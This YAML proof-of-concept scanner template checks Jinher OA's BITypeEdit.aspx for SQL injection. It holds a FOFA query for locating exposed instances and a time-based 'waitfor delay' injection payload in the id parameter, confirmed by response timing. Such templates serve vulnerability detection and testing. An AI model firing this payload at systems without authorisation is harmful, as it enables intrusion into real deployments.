id: poc-yaml-jinher-bitypeedit-aspx-sqli
info:
  name: 金和OA BITypeEdit.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.BIframe/BITypeEdit.aspx/?type=edit&id=1'waitfor+delay'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"修改报表类型") &&

    contains(gbk_decode(body),"类型名称") &&

    contains(gbk_decode(body),"请输入类型名称") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
